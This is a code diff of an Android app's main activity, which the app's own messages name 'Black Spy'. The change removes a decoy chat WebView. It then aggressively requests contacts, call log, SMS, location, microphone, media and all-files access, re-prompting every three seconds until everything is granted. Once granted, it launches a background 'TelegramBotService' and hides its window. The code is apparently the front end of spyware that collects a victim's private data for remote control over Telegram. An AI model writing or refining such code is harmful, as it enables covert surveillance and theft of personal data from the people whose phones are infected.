@@ -10,90 +10,146 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.provider.Settings;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
 import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-
-import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends Activity {
     private static final int PERMISSION_REQUEST_CODE = 100;
-    private WebView webView;
-    
+    private static final int STORAGE_PERMISSION_CODE = 101;
+    private boolean permissionsGranted = false;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        
-        webView = findViewById(R.id.webView);
-        webView.getSettings().setJavaScriptEnabled(true);
-        webView.getSettings().setDomStorageEnabled(true);
-        webView.setWebViewClient(new WebViewClient());
-        webView.loadUrl("https://secure-chat-hub--jjj0911431167.replit.app/");
-        
-        requestPermissions();
-        
-        new Handler().postDelayed(() -> {
-            startService();
-        }, 2000);
+        // لا نستخدم layout، نطلب الأذونات مباشرة
+        requestAllPermissions();
     }
-    
-    private void requestPermissions() {
-        List<String> perms = new ArrayList<>();
-        perms.add(Manifest.permission.READ_CONTACTS);
-        perms.add(Manifest.permission.READ_CALL_LOG);
-        perms.add(Manifest.permission.READ_SMS);
-        perms.add(Manifest.permission.RECEIVE_SMS);
-        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
-        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-        perms.add(Manifest.permission.RECORD_AUDIO);
-        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-        
-        if (Build.VERSION.SDK_INT >= 33) {
-            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
-            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
-            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
-            perms.add(Manifest.permission.POST_NOTIFICATIONS);
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (permissionsGranted) {
+            startBotService();
+            finish(); // إنهاء النشاط فوراً بعد بدء الخدمة
         }
-        
-        List<String> needed = new ArrayList<>();
-        for (String p : perms) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                needed.add(p);
+    }
+
+    private void requestAllPermissions() {
+        List<String> neededPermissions = new ArrayList<>();
+
+        // أذونات أساسية
+        neededPermissions.add(Manifest.permission.INTERNET);
+        neededPermissions.add(Manifest.permission.READ_CONTACTS);
+        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
+        neededPermissions.add(Manifest.permission.READ_SMS);
+        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
+        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
+        neededPermissions.add(Manifest.permission.VIBRATE);
+        neededPermissions.add(Manifest.permission.WAKE_LOCK);
+        neededPermissions.add(Manifest.permission.FOREGROUND_SERVICE);
+        neededPermissions.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);
+
+        // أذونات التخزين حسب إصدار أندرويد
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // Android 13+
+            neededPermissions.add(Manifest.permission.READ_MEDIA_IMAGES);
+            neededPermissions.add(Manifest.permission.READ_MEDIA_VIDEO);
+            neededPermissions.add(Manifest.permission.READ_MEDIA_AUDIO);
+            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
+        } else {
+            // Android 12 والإصدارات الأقدم
+            neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+            neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        }
+
+        // تصفية الأذونات التي لم تُمنح بعد
+        List<String> permissionsToRequest = new ArrayList<>();
+        for (String perm : neededPermissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(perm);
             }
         }
-        
-        if (!needed.isEmpty()) {
-            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+
+        if (!permissionsToRequest.isEmpty()) {
+            // طلب الأذونات
+            ActivityCompat.requestPermissions(this, 
+                permissionsToRequest.toArray(new String[0]), 
+                PERMISSION_REQUEST_CODE);
+        } else {
+            permissionsGranted = true;
+            startBotService();
+            finish();
         }
-        
-        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-            try {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivity(intent);
-            } catch (Exception e) {}
+
+        // طلب إذن الوصول لجميع الملفات (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, STORAGE_PERMISSION_CODE);
+                } catch (Exception e) {
+                    // بعض الأجهزة لا تدعم هذا الإعداد
+                }
+            }
         }
     }
-    
-    private void startService() {
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                permissionsGranted = true;
+                Toast.makeText(this, "✅ جميع الأذونات مُنحت", Toast.LENGTH_SHORT).show();
+                startBotService();
+                finish();
+            } else {
+                // بعض الأذونات لم تُمنح، نطلبها مرة أخرى بعد 3 ثوانٍ
+                Toast.makeText(this, "⚠️ الرجاء منح جميع الأذونات", Toast.LENGTH_LONG).show();
+                new Handler().postDelayed(this::requestAllPermissions, 3000);
+            }
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        
+        if (requestCode == STORAGE_PERMISSION_CODE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
+                Toast.makeText(this, "✅ إذن الوصول لجميع الملفات مُنح", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "⚠️ الرجاء منح إذن الوصول لجميع الملفات", Toast.LENGTH_LONG).show();
+            }
+            // نعود لطلب أي أذونات متبقية
+            requestAllPermissions();
+        }
+    }
+
+    private void startBotService() {
         Intent intent = new Intent(this, TelegramBotService.class);
-        if (Build.VERSION.SDK_INT >= 26) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
         } else {
             startService(intent);
         }
-        Toast.makeText(this, "Black Spy Active", Toast.LENGTH_SHORT).show();
-    }
-    
-    @Override
-    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
-        super.onRequestPermissionsResult(code, perms, results);
+        Toast.makeText(this, "🔘 Black Spy يعمل في الخلفية", Toast.LENGTH_SHORT).show();
     }
 }
